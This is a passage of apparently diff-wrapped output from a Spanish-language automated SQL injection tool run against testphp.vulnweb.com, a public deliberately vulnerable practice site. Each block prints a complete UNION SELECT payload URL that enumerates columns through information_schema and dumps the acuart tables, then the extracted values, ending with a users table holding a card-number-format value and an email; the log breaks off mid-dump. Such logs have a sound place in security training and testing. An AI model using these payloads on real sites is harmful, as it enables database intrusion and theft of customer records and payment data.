+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,column_name,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from information_schema.columns where table_name=&#x27;artists&#x27; -- -=17&amp;prueba=5
+[+] Se han encontrado 3 columnas: [&#x27;adesc&#x27;, &#x27;aname&#x27;, &#x27;artist_id&#x27;]
+
+[!] Buscando los datos de la columna adesc
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,adesc,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.artists -- -=17&amp;prueba=5
+[+] Se han encontrado 1 datos:  [&#x27;\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\n    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\n    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\n    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\n    Mauris magna eros, semper a, tempor et, rutrum et, tortor.\n\n\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\n    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a mpainted by: parametro8comment on this picture&#x27;]
+
+[!] Buscando los datos de la columna aname
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,aname,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.artists -- -=17&amp;prueba=5
+[+] Se han encontrado 3 datos:  [&#x27;r4w8173&#x27;, &#x27;Blad3&#x27;, &#x27;lyzae&#x27;]
+
+[!] Buscando los datos de la columna artist_id
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,artist_id,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.artists -- -=17&amp;prueba=5
+[+] Se han encontrado 3 datos:  [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;]
+
+[!] Buscando las columnas de la tabla carts
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,column_name,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from information_schema.columns where table_name=&#x27;carts&#x27; -- -=17&amp;prueba=5
+[+] Se han encontrado 3 columnas: [&#x27;cart_id&#x27;, &#x27;item&#x27;, &#x27;price&#x27;]
+
+[!] Buscando los datos de la columna cart_id
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,cart_id,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.carts -- -=17&amp;prueba=5
+[+] Se han encontrado 1 datos:  [&#x27;ee641421945e33ee9b6a1606ba28c017&#x27;]
+
+[!] Buscando los datos de la columna item
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,item,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.carts -- -=17&amp;prueba=5
+[+] Se han encontrado 1 datos:  [&#x27;1&#x27;]
+
+[!] Buscando los datos de la columna price
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,price,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.carts -- -=17&amp;prueba=5
+[+] Se han encontrado 1 datos:  [&#x27;500&#x27;]
+
+[!] Buscando las columnas de la tabla categ
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,column_name,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from information_schema.columns where table_name=&#x27;categ&#x27; -- -=17&amp;prueba=5
+[+] Se han encontrado 3 columnas: [&#x27;cat_id&#x27;, &#x27;cdesc&#x27;, &#x27;cname&#x27;]
+
+[!] Buscando los datos de la columna cat_id
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,cat_id,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.categ -- -=17&amp;prueba=5
+[+] Se han encontrado 4 datos:  [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;]
+
+[!] Buscando los datos de la columna cdesc
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,cdesc,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.categ -- -=17&amp;prueba=5
+[+] Se han encontrado 4 datos:  [&#x27;Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenati&#x27;, &#x27;Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenati&#x27;, &#x27;Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenati&#x27;, &#x27;Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla &#x27;]
+
+[!] Buscando los datos de la columna cname
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,cname,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.categ -- -=17&amp;prueba=5
+[+] Se han encontrado 4 datos:  [&#x27;Posters&#x27;, &#x27;Paintings&#x27;, &#x27;Stickers&#x27;, &#x27;Graffity&#x27;]
+
+[!] Buscando las columnas de la tabla featured
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,column_name,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from information_schema.columns where table_name=&#x27;featured&#x27; -- -=17&amp;prueba=5
+[+] Se han encontrado 2 columnas: [&#x27;feature_text&#x27;, &#x27;pic_id&#x27;]
+
+[!] Buscando los datos de la columna feature_text
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,feature_text,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.featured -- -=17&amp;prueba=5
+[+] Se han encontrado 0 datos:  []
+
+[!] Buscando los datos de la columna pic_id
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,pic_id,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.featured -- -=17&amp;prueba=5
+[+] Se han encontrado 0 datos:  []
+
+[!] Buscando las columnas de la tabla guestbook
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,column_name,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from information_schema.columns where table_name=&#x27;guestbook&#x27; -- -=17&amp;prueba=5
+[+] Se han encontrado 3 columnas: [&#x27;mesaj&#x27;, &#x27;sender&#x27;, &#x27;senttime&#x27;]
+
+[!] Buscando los datos de la columna mesaj
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,mesaj,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.guestbook -- -=17&amp;prueba=5
+[+] Se han encontrado 0 datos:  []
+
+[!] Buscando los datos de la columna sender
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,sender,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.guestbook -- -=17&amp;prueba=5
+[+] Se han encontrado 0 datos:  []
+
+[!] Buscando los datos de la columna senttime
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,senttime,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.guestbook -- -=17&amp;prueba=5
+[+] Se han encontrado 0 datos:  []
+
+[!] Buscando las columnas de la tabla pictures
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,column_name,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from information_schema.columns where table_name=&#x27;pictures&#x27; -- -=17&amp;prueba=5
+[+] Se han encontrado 8 columnas: [&#x27;a_id&#x27;, &#x27;cat_id&#x27;, &#x27;img&#x27;, &#x27;pic_id&#x27;, &#x27;plong&#x27;, &#x27;price&#x27;, &#x27;pshort&#x27;, &#x27;title&#x27;]
+
+[!] Buscando los datos de la columna a_id
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,a_id,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.pictures -- -=17&amp;prueba=5
+[+] Se han encontrado 7 datos:  [&#x27;1&#x27;, &#x27;1&#x27;, &#x27;1&#x27;, &#x27;1&#x27;, &#x27;1&#x27;, &#x27;1&#x27;, &#x27;2&#x27;]
+
+[!] Buscando los datos de la columna cat_id
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,cat_id,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.pictures -- -=17&amp;prueba=5
+[+] Se han encontrado 7 datos:  [&#x27;1&#x27;, &#x27;1&#x27;, &#x27;1&#x27;, &#x27;1&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;1&#x27;]
+
+[!] Buscando los datos de la columna img
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,img,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.pictures -- -=17&amp;prueba=5
+[+] Se han encontrado 7 datos:  [&#x27;./pictures/1.jpg&#x27;, &#x27;./pictures/2.jpg&#x27;, &#x27;./pictures/3.jpg&#x27;, &#x27;./pictures/4.jpg&#x27;, &#x27;./pictures/5.jpg&#x27;, &#x27;./pictures/6.jpg&#x27;, &#x27;./pictures/7.jpg&#x27;]
+
+[!] Buscando los datos de la columna pic_id
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,pic_id,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.pictures -- -=17&amp;prueba=5
+[+] Se han encontrado 7 datos:  [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;]
+
+[!] Buscando los datos de la columna plong
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,plong,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.pictures -- -=17&amp;prueba=5
+[+] Se han encontrado 2 datos:  [&#x27;\nThis picture is an 53 cm x 12 cm masterpiece.\n\n\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n&#x27;, &#x27;\nThis picture is an 53 cm x 12 cm masterpiece.\n\n\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is beipainted by: parametro8comment on this picture&#x27;]
+
+[!] Buscando los datos de la columna price
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,price,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.pictures -- -=17&amp;prueba=5
+[+] Se han encontrado 7 datos:  [&#x27;500&#x27;, &#x27;800&#x27;, &#x27;986&#x27;, &#x27;1000&#x27;, &#x27;460&#x27;, &#x27;10000&#x27;, &#x27;15000&#x27;]
+
+[!] Buscando los datos de la columna pshort
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,pshort,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.pictures -- -=17&amp;prueba=5
+[+] Se han encontrado 7 datos:  [&#x27;Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu.&#x27;, &#x27;Donec molestie.\nSed aliquam sem ut arcu.&#x27;, &#x27;Lorem ipsum dolor sit amet. Donec molestie.\nSed aliquam sem ut arcu.&#x27;, &#x27;Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin.\n&#x27;, &#x27;Lorem ipsum dolor sit amet, consectetuer adipiscing elit.&#x27;, &#x27;Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin.\n&#x27;, &#x27;bla bla bla&#x27;]
+
+[!] Buscando los datos de la columna title
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,title,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.pictures -- -=17&amp;prueba=5
+[+] Se han encontrado 7 datos:  [&#x27;The shore&#x27;, &#x27;Mistery&#x27;, &#x27;The universe&#x27;, &#x27;Walking&#x27;, &#x27;Mean&#x27;, &#x27;Thing&#x27;, &#x27;Trees&#x27;]
+
+[!] Buscando las columnas de la tabla products
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,column_name,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from information_schema.columns where table_name=&#x27;products&#x27; -- -=17&amp;prueba=5
+[+] Se han encontrado 5 columnas: [&#x27;description&#x27;, &#x27;id&#x27;, &#x27;name&#x27;, &#x27;price&#x27;, &#x27;rewritename&#x27;]
+
+[!] Buscando los datos de la columna description
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,description,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.products -- -=17&amp;prueba=5
+[+] Se han encontrado 3 datos:  [&#x27;NET STORAGE ENCLOSURE SATA DNS-313 D-LINK&#x27;, &#x27;Web Camera A4Tech PK-335E&#x27;, &#x27;Laser Color Printer HP LaserJet M551dn, A4&#x27;]
+
+[!] Buscando los datos de la columna id
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,id,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.products -- -=17&amp;prueba=5
+[+] Se han encontrado 3 datos:  [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;]
+
+[!] Buscando los datos de la columna name
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,name,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.products -- -=17&amp;prueba=5
+[+] Se han encontrado 3 datos:  [&#x27;Network Storage D-Link DNS-313 enclosure 1 x SATA&#x27;, &#x27;Web Camera A4Tech PK-335E&#x27;, &#x27;Laser Color Printer HP LaserJet M551dn, A4&#x27;]
+
+[!] Buscando los datos de la columna price
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,price,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.products -- -=17&amp;prueba=5
+[+] Se han encontrado 3 datos:  [&#x27;359&#x27;, &#x27;10&#x27;, &#x27;812&#x27;]
+
+[!] Buscando los datos de la columna rewritename
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,rewritename,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.products -- -=17&amp;prueba=5
+[+] Se han encontrado 3 datos:  [&#x27;network-attached-storage-dlink&#x27;, &#x27;web-camera-a4tech&#x27;, &#x27;color-printer&#x27;]
+
+[!] Buscando las columnas de la tabla users
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,column_name,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from information_schema.columns where table_name=&#x27;users&#x27; -- -=17&amp;prueba=5
+[+] Se han encontrado 8 columnas: [&#x27;address&#x27;, &#x27;cart&#x27;, &#x27;cc&#x27;, &#x27;email&#x27;, &#x27;name&#x27;, &#x27;pass&#x27;, &#x27;phone&#x27;, &#x27;uname&#x27;]
+
+[!] Buscando los datos de la columna address
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,address,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.users -- -=17&amp;prueba=5
+[+] Se han encontrado 1 datos:  [&#x27;https://github.com/henriquecesar139&#x27;]
+
+[!] Buscando los datos de la columna cart
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,cart,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.users -- -=17&amp;prueba=5
+[+] Se han encontrado 1 datos:  [&#x27;ee641421945e33ee9b6a1606ba28c017&#x27;]
+
+[!] Buscando los datos de la columna cc
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,cc,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.users -- -=17&amp;prueba=5
+[+] Se han encontrado 1 datos:  [&#x27;4002-8922-4002-8922&#x27;]
+
+[!] Buscando los datos de la columna email
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,email,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.users -- -=17&amp;prueba=5
+[+] Se han encontrado 1 datos:  [&#x27;nqueroprova@gmail.com&#x27;]
+
+[!] Buscando los datos de la columna name
+
